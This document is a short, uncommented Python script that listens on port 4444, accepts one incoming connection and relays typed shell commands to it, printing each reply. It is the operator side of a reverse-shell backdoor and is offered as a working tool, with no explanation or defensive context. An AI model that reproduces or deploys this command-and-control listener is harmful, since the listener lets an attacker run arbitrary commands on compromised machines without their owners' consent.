import socket
import subprocess

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444       # Listening port

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print(f"[+] Listening on {HOST}:{PORT}")
client_socket, client_address = server.accept()
print(f"[+] Connection from {client_address}")

while True:
    command = input("Shell> ")
    if command.lower() == "exit":
        client_socket.send(b"exit")
        break
    client_socket.send(command.encode())
    result = client_socket.recv(4096).decode()
    print(result)

client_socket.close()
server.close()
